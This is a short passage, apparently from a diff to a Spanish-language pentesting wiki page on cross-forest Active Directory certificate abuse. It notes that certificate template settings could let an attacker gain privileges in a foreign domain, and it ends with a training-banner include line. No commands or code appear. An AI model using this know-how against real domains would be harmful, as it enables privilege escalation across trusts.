 Ambos escenarios conducen a un **aumento en la superficie de ataque** de un bosque a otro. La configuración de la plantilla de certificado podría ser explotada por un atacante para obtener privilegios adicionales en un dominio extranjero.
+
+{{#include ../../../banners/hacktricks-training.md}}
